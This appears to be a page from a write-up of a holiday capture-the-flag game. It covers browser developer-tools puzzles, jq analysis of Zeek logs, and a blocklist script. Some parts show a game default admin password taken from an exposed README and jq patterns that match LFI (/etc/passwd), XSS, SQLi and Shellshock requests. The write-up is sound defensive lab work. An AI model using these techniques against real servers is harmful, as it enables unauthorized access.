+BUT - I'm pretty sure you'll need to use Chrome's developer tools for that one.
+Or sorry, you're a Firefox fan?
+Yeah, Safari's fine too - I just have an ineffible hunger for a physical Esc key.
+Edge? That's cool. Hm? No no, I was thinking of an unrelated thing.
+Curl fan? Right on! Just remember: the Windows one doesn't like double quotes.  </p>
+<p>Old school, huh? Oh sure - I've got what you need right here...<br />
+...<br />
+...<br />
+And I hear the Holiday Hack Trail game will give hints on the last screen if you complete it on Hard.</p>
+</div>
+<h3 id="talk-to-shinny-upatree">Talk to Shinny Upatree</h3>
+<div class="admonition quote">
+<p><img align="left" src="img/elf16.png">
+<em>Psst - hey!</em></p>
+<p>I'm Shinny Upatree, and I know what's going on!</p>
+<p>Yeah, that's right - guarding the sleigh shop has made me privvy to some serious, high-level intel.</p>
+<p>In fact, I know WHO is causing all the trouble.</p>
+<p>Cindy? Oh no no, not that who. And stop guessing - you'll never figure it out.</p>
+<p>The only way you could would be if you could break into my <a href="https://crate.elfu.org">crate</a>, here.</p>
+<p>You see, I've written the villain's name down on a piece of paper and hidden it away securely!</p>
+</div>
+<h3 id="unlock-the-crate">Unlock the Crate</h3>
+<p>Click on the crate.  Your browser opens to <a href="http://sleighworkshopdoor.elfu.org/">http://sleighworkshopdoor.elfu.org/</a>.  Answer a series of questions using the browser developer tools to find secrets hidden within the website.  See the hints in your badge for help using the developer tools in most popular browsers.  The walkthru assumes you use Google Chrome.</p>
+<div class="admonition caution">
+<p class="admonition-title">Caution</p>
+<p>Each time you play this game, all but a couple of the values are different.  If you reload the page, you won't be able to reuse your previous answers.</p>
+</div>
+<p><strong>Lock #1</strong> - You don't need a clever riddle to open the console and scroll a little  </p>
+<p>Solution: Open your browser's developer tools, switch to the Console tab, and scroll through the history to find this code.</p>
+<p><strong>Lock #2</strong> - Some codes are hard to spy, perhaps they'll show up on pulp with dye?  </p>
+<p>Solution: Go to the print preview, and you'll find the code printed off to the right of the riddle.</p>
+<p>Alternative: Search for the div tag that contains class="libra" under the Elements tab of the developers tools.  The code is shown here as well.</p>
+<p><strong>Lock #3</strong> - Look in the network tab for the image file that looks like a GUID string (example: c9c54b13-a1f9-4817-8f88-c002607498be.png).  The code is displayed in the image.</p>
+<p>Solution: In the network tab, there is a png file with a GUID name. Click on it, then click on preview, and you'll see the code.</p>
+<p><strong>Lock #4</strong> - Where might we keep the things we forage? Yes, of course: Local barrels!  </p>
+<p>Solution: Go to the Application tab and look under Local Storage.</p>
+<p><strong>Lock #5</strong> - Did you notice the code in the title? It may very well prove vital.  </p>
+<p>Solution: You can find this on the Source tab under "(index)", or you can right click on the page and click View Source. Either way, scroll to the top and look all the way to the right inside of the <code>&lt;title&gt;</code> tags.  </p>
+<p><strong>Lock #6</strong> - In order for this hologram to be effective, it may be necessary to increase your perspective.  </p>
+<p>Solution: Use the element inspector tool (Ctrl+Shift+C in Chrome) to click on the hologram. Find .hologram under Styles and add zeros to the current value of perspective (15px).  The code is easily read at 15000px.</p>
+<p><strong>Lock #7</strong> - The font you're seeing is pretty slick, but this lock's code was my first pick.  </p>
+<p>Solution: Use the element inspector tool to select the text of any hint.  In the .instructions class, you'll see a font-family with the code as the first of multiple values.  </p>
+<p><strong>Lock #8</strong> - In the event that the .eggs go bad, you must figure out who will be sad.  </p>
+<p>Solution: Use the element inspector tool to click on the text .eggs, click on Event Handlers, and then expand spoil. This lock has a fixed value: VERONICA</p>
+<p><strong>Lock #9</strong> - This next code will be unredacted, but only when all the chakras are :active.  </p>
+<p>Solution: Use the element inspector tool to select any text in this riddle. In the source, you'll find multiple uses of div tags with class "chakra". Right click on each one of them, select Force State, then select :active.  Once all of the chakras are active, the code will appear in the riddle.</p>
+<p><strong>Lock #10</strong> - Oh, no! This lock's out of commission! Pop off the cover and locate what's missing.  </p>
+<p>Solution: Use the element inspector tool to select the lock. Expand the div containing class="lock c10", then right click on the div tag containing class="cover" and disable the element.  Find the code printed on the circuit board (kd29xj37), enter it into the lock and press the button. The lock remains closed. </p>
+<p>Now look in the console, and see that there is an error about a "Missing Macaroni."  Scroll up in the Elements tab a little and you'll find <code>&lt;div class="component macaroni" data-code="A33"&gt;&lt;/div&gt;</code>. Click and drag this down into the html source code of the last lock, right under the disabled lock class.  A macaroni now appears on the circuit board.  Click the button, but still nothing happens. </p>
+<p>Check the console again.  Now there is an error about a missing Cotton Swab.  Repeat the steps above to put the swab inside the lock, and then repeat them one more time for the missing Gnome.  Now click the button, and the final lock is opened.</p>
+<p><img alt="Paper hidden in the crate" src="img/crate-answer.png" /></p>
+<p><strong>Answer: The Tooth Fairy</strong></p>
+<h3 id="hint-from-shinny-upatree">Hint from Shinny Upatree</h3>
+<div class="admonition quote">
+<p><img align="left" src="img/elf16.png">
+Wha - what?? You got into my crate?!</p>
+<p>Well that's embarrassing...</p>
+<p>But you know what? Hmm... If you're good enough to crack MY security...</p>
+<p>Do you think you could bring this all to a grand conclusion?</p>
+<p>Please go into the sleigh shop and see if you can finish this off!</p>
+<p>Stop the Tooth Fairy from ruining Santa's sleigh route!</p>
+</div>
+<h3 id="talk-to-the-tooth-fairy">Talk to The Tooth Fairy</h3>
+<p>After entering the answer into your badge, the sleigh shop door opens.  Inside is the Tooth Fairy.</p>
+<div class="admonition quote">
+<p><img align="left" src="img/toothfairy.png">
+I’m the Tooth Fairy, the mastermind behind the plot to destroy the holiday season.  </p>
+<p>I hate how Santa is so beloved, but only works one day per year!<br />
+He has all of the resources of the North Pole and the elves to help him too.  </p>
+<p>I run a solo operation, toiling year-round collecting deciduous bicuspids and more from children.<br />
+But I get nowhere near the gratitude that Santa gets. He needs to share his holiday resources with the rest of us!</p>
+<p>But, although you found me, you haven’t foiled my plot!
+Santa’s sleigh will NOT be able to find its way.
+I will get my revenge and respect!
+I want my own holiday, National Tooth Fairy Day, to be the most popular holiday on the calendar!!!</center></p>
+</div>
+<h2 id="objective-12-filter-out-poisoned-sources-of-weather-data">Objective 12 - Filter Out Poisoned Sources of Weather Data</h2>
+<p><em>Use the data supplied in the <a href="https://downloads.elfu.org/http.log.gz">Zeek JSON logs</a> to identify the IP addresses of attackers poisoning Santa's flight mapping software. <a href="https://srf.elfu.org/">Block the 100 offending sources of information to guide Santa's sleigh</a> through the attack. Submit the Route ID ("RID") success value that you're given. For hints on achieving this objective, please visit the Sleigh Shop and talk with Wunorse Openslae.  (Difficulty: 4 out of 5)</em></p>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>The music in this room is inspired by the song "Supercalifragilisticexpialidocious" from <em>Mary Poppins</em>.</p>
+</div>
+<h3 id="talk-to-wunorse-openslae">Talk to Wunorse Openslae</h3>
+<div class="admonition quote">
+<p><img align="left" src="img/wunorse.png">
+Wunorse Openslae here, just looking at some Zeek logs.</p>
+<p>I'm pretty sure one of these connections is a malicious C2 channel...</p>
+<p>Do you think you could take a look?</p>
+<p>I hear a lot of C2 channels have very long connection times.</p>
+<p>Please use jq to find the longest connection in this data set.</p>
+<p>We have to kick out any and all grinchy activity!</p>
+</div>
+<h3 id="terminal-zeek-logs">Terminal: Zeek Logs</h3>
+<p><img alt="Zeek JSON Terminal" src="img/terminal-jq.png" /></p>
+<p>Read the <a href="https://pen-testing.sans.org/blog/2019/12/03/parsing-zeek-json-logs-with-jq-2">SANS pen-testing blog post</a> supplied in your hints for help using jq to parse the zeek json logs. </p>
+<p>Sort the json data by duration in reverse order (highest to lowest), then displays only the first event.</p>
+<div class="codehilite"><pre><span></span>elf@07223ffe4973:~$ cat conn.log | jq -s &#39;sort_by(.duration) | reverse | .[0]&#39;
+{
+  &quot;ts&quot;: &quot;2019-04-18T21:27:45.402479Z&quot;,
+  &quot;uid&quot;: &quot;CmYAZn10sInxVD5WWd&quot;,
+  &quot;id.orig_h&quot;: &quot;192.168.52.132&quot;,
+  &quot;id.orig_p&quot;: 8,
+  &quot;id.resp_h&quot;: &quot;13.107.21.200&quot;,
+  &quot;id.resp_p&quot;: 0,
+  &quot;proto&quot;: &quot;icmp&quot;,
+  &quot;duration&quot;: 1019365.337758,
+  &quot;orig_bytes&quot;: 30781920,
+  &quot;resp_bytes&quot;: 30382240,
+  &quot;conn_state&quot;: &quot;OTH&quot;,
+  &quot;missed_bytes&quot;: 0,
+  &quot;orig_pkts&quot;: 961935,
+  &quot;orig_ip_bytes&quot;: 57716100,
+  &quot;resp_pkts&quot;: 949445,
+  &quot;resp_ip_bytes&quot;: 56966700
+}
+</pre></div>
+
+
+<p>Use the value 13.107.21.200 in the id.resp_h field to solve the terminal.</p>
+<div class="codehilite"><pre><span></span>elf@07223ffe4973:~$ runtoanswer 
+Loading, please wait......
+What is the destination IP address with the longes connection duration? 13.107.21.200
+Thank you for your analysis, you are spot-on.
+I would have been working on that until the early dawn.
+Now that you know the features of jq,
+You&#39;ll be able to answer other challenges too.
+-Wunorse Openslae
+Congratulations!
+</pre></div>
+
+
+<h3 id="hint-from-wunorse-openslae">Hint from Wunorse Openslae</h3>
+<div class="admonition quote">
+<p><img align="left" src="img/wunorse.png">
+That's got to be the one - thanks!</p>
+<p>Hey, you know what? We've got a crisis here.
+You see, Santa's flight route is planned by a complex set of machine learning algorithms which use available weather data.
+All the weather stations are reporting severe weather to Santa's Sleigh. I think someone might be forging intentionally false weather data!
+I'm so flummoxed I can't even remember how to login!</p>
+<p>Hmm... Maybe the Zeek http.log could help us.
+I worry about LFI, XSS, and SQLi in the Zeek log - oh my!
+And I'd be shocked if there weren't some shell stuff in there too.
+I'll bet if you pick through, you can find some naughty data from naughty hosts and block it in the firewall.</p>
+<p>If you find a log entry that definitely looks bad, try pivoting off other unusual attributes in that entry to find more bad IPs.
+The sleigh's machine learning device (SRF) needs most of the malicious IPs blocked in order to calculate a good route.
+Try not to block many legitimate weather station IPs as that could also cause route calculation failure.
+Remember, when looking at JSON data, jq is the tool for you!</p>
+</div>
+<h3 id="talk-to-krampus">Talk to Krampus</h3>
+<div class="admonition quote">
+<p><img align="left" src="img/krampus.png" height="200">
+But there’s still time! </p>
+<p>Solve the final challenge in your badge by blocking the bad IPs at srf.elfu.org and save the holiday season!</p>
+</div>
+<h3 id="block-naughty-hosts">Block naughty hosts</h3>
+<p>First you need to figure out how to sign into the SRF webpage.</p>
+<p>In the Smart Braces Terminal, Kent mentioned that the Sleigh Route Finder is being tested at srf.elfu.org with default credentials, and the unencrypted PDF from the previous challenge states that the default creds are in the git repo.  There haven't been any hints of a git repository, and there's nothing in Github that looks remotely useful.  Sometimes admins get sloppy when pushing their projects into production, so the password might be on the production server itself.  A README.md file is a common file to find in a git repo; check to see if it can be requested from the web server.</p>
+<div class="codehilite"><pre><span></span>$ curl https://srf.elfu.org/README.md
+
+    # Sled-O-Matic - Sleigh Route Finder Web API
+
+    ### Installation
+
+    ```
+    sudo apt install python3-pip
+    sudo python3 -m pip install -r requirements.txt
+    ```
+
+    #### Running:
+
+    `python3 ./srfweb.py`
+
+    #### Logging in:
+
+    You can login using the default admin pass:
+
+    `admin 924158F9522B3744F5FCD4D10FAC4356`
+
+    However, it&#39;s recommended to change this in the sqlite db to something custom.
+</pre></div>
+
+
+<p>The README.md file from the github repo was copied into production, which provides the default credentials.  The instructions recommend changing this password, but lucky for you, that was not done.  Sign in with the supplied default admin password.</p>
+<p>The hints suggest that Wunorse is concerned about Local File Inclusion (LFI), Cross Site Scripting (XSS), SQL injection (SQLi), and Shellshock attacks.  To detect these attacks in the logs, look in the fields that carry user-supplied inputs (uri, host, username, and user_agent).  Each attack involves sending a specially crafted request; if you know what each of these looks like, it's pretty easy to search for them.</p>
+<table>
+<thead>
+<tr>
+<th>Attack</th>
+<th>What to look for</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>LFI</td>
+<td>There's a multitude of LFI attack strings you could look for, but the attacker in this scenario seems to be interested in the <code>/etc/passwd</code> file, so search for that</td>
+</tr>
+<tr>
+<td>XSS</td>
+<td>Cross site scripting usually involves injecting html tags into an input field, so any request that contains <code>&lt;</code> should be considered suspicious</td>
+</tr>
+<tr>
+<td>SQLi</td>
+<td>SQL injection attacks almost always include a <code>'</code> (single quote) character</td>
+</tr>
+<tr>
+<td>Shell Shock</td>
+<td>If <code>() {</code> appears in the user agent string, that's definitely a red flag</td>
+</tr>
+</tbody>
+</table>
+<p>Use jq to search for these telltale strings in the fields that contain user-supplied data.</p>
+<p><code>jq -j --arg a "(\/etc\/passwd|\&lt;|\'|\(\) {)" '.[] | select(.uri,.host,.user_agent,.username | test($a)) | ."id.orig_h", "\n"' http.log</code></p>
+<p>This will produce 58 unique bad actor IP addresses that can be blocked, but that's a bit shy of the 100 that Wunorse suggested there might be.</p>
+<p>Look over the results, and you'll notice that many of the attacks that target the URI string have bogus-looking user agent strings.  Here are a few examples that stand out:</p>
+<div class="codehilite"><pre><span></span>Mozilla/4.0 (compatible; MSIEE 7.0; Windows NT 5.1)
+Mozilla4.0 (compatible; MSSIE 8.0; Windows NT 5.1; Trident/5.0)
+Mozilla/4.0 (compatible; MSIE 8.0; Window NT 5.1)
+Mozilla/5.0 (compatible; Goglebot/2.1; +http://www.google.com/bot.html)
+</pre></div>
+
+
+<p>You'll need to search through the logs to find out what other IP addresses these user agent strings have been seen at, and add those to the block list as well.  Here's a script that does it all:</p>
+<div class="codehilite"><pre><span></span><span class="ch">#!/bin/bash</span>
+
+<span class="c1"># Get the IP addresses that sent bad requests</span>
+
+jq -j --arg a <span class="s2">&quot;(\/etc\/passwd|\&lt;|\&#39;|\(\) {)&quot;</span> <span class="s1">&#39;.[] | select(.uri,.host,.user_agent,.username | test($a)) | .&quot;id.orig_h&quot;, &quot;\n&quot;&#39;</span> http.log &gt; badips
+
+<span class="c1"># Get the user agent strings that targetted the URI string</span>
+
+jq -j --arg a <span class="s2">&quot;(\/etc\/passwd|\&lt;|\&#39;)&quot;</span> <span class="s1">&#39;.[] | select(.uri | test($a)) | .user_agent, &quot;\n&quot;&#39;</span> http.log <span class="p">|</span> sort <span class="p">|</span> uniq <span class="se">\</span>
+ <span class="p">|</span> sed <span class="s2">&quot;s/;/\\;/g&quot;</span> <span class="p">|</span> sed <span class="s2">&quot;s/(/./g&quot;</span> <span class="p">|</span> sed <span class="s2">&quot;s/)/./g&quot;</span> &gt; badagents
+
+<span class="c1"># Iterate through list of bad user agents and obtain all of the IP addresses they were using</span>
+
+<span class="k">while</span> <span class="nv">IFS</span><span class="o">=</span><span class="s2">&quot;&quot;</span> <span class="nb">read</span> -r p <span class="o">||</span> <span class="o">[</span> -n <span class="s2">&quot;</span><span class="nv">$p</span><span class="s2">&quot;</span> <span class="o">]</span>
+<span class="k">do</span>
+  jq -j --arg a <span class="s2">&quot;</span><span class="nv">$p</span><span class="s2">&quot;</span> <span class="s1">&#39;.[] | select(.user_agent|test($a)) | .&quot;id.orig_h&quot;, &quot;\n&quot;&#39;</span> http.log &gt;&gt; badips
+<span class="k">done</span> &lt;badagents
+
+<span class="c1"># Deduplicate and output the badip list to a blocklist that can be copied </span>
+<span class="c1"># and pasted into the Sleigh Route Finder firewall config page</span>
+
+cat badips <span class="p">|</span> sort <span class="p">|</span> uniq <span class="p">|</span> sed <span class="s1">&#39;s/$/,/g&#39;</span> &gt; blocklist
+</pre></div>
+
+
+<p>Copy and paste these IP addresses into the firewall configuration tab of the Sleigh Route Finder website and click Deny.</p>
+<p>Route Calculation Success! RID:0807198508261964</p>
+<h2 id="visit-the-bell-tower">Visit the Bell Tower</h2>
+<p>The door to the bell tower is now open.  Here you'll find Krampus, Santa, and the Toothfairy (now wearing an orange prison jump suit).</p>
+<p><img alt="" src="img/belltower.png" /></p>
+<div class="admonition quote">
+<p><img align="left" src="img/toothfairy_orange.png">
+You foiled my dastardly plan! I’m ruined!</p>
+<p>And I would have gotten away with it too, if it weren't for you meddling kids!</p>
+</div>
+<div class="admonition quote">
+<p><img align="left" src="img/krampus.png" height="200">
+Congratulations on a job well done!</p>
+<p>Oh, by the way, I won the Frido Sleigh contest.</p>
+<p>I got 31.8% of the prizes, though I'll have to figure that out.</p>
+</div>
+<div class="admonition quote">
+<p><img align="left" src="img/santa.png">
+You did it! Thank you! You uncovered the sinister plot to destroy the holiday season!</p>
+<p>Through your diligent efforts, we’ve brought the Tooth Fairy to justice and saved the holidays!</p>
+<p>Ho Ho Ho!</p>
+<p>The more I laugh, the more I fill with glee.<br />
+And the more the glee, The more I'm a merrier me!</p>
+<p>Merry Christmas and Happy Holidays.</p>
+</div>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>Another <em>Mary Poppins</em> quote to end the game.  This time it's "The more I laugh, the more I fill with glee..." which comes from the song I Love to Laugh.</p>
+</div>
+<p>Just when you're satisfied with a job well done, you notice a scrap of paper in the corner.</p>
+<p><center>
+<img alt="" src="img/belltower-note.png" /></p>
+<p><audio src="files/Dun-Dun-Dun-Sound-Effect.mp3" controls="controls">
+Your browser does not support the audio element.
+</audio>
+</center></p>
+<p>Roll credits..</p>
+                
+                  
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid">
+        
+          <a href="index.html" title="Introduction" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
+            </div>
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  Previous
+                </span>
+                Introduction
+              </span>
+            </div>
+          </a>
+        
+        
+          <a href="narrative.html" title="Narrative" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  Next
+                </span>
+                Narrative
+              </span>
+            </div>
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
+            </div>
+          </a>
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+        powered by
+        <a href="https://www.mkdocs.org">MkDocs</a>
+        and
+        <a href="https://squidfunk.github.io/mkdocs-material/">
+          Material for MkDocs</a>
+      </div>
+      
+        
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="assets/javascripts/application.b41f3d20.js"></script>
+      
+      <script>app.initialize({version:"1.0.4",url:{base:"."}})</script>
+      
+    
+    
+      
+    
+  </body>
+</html>
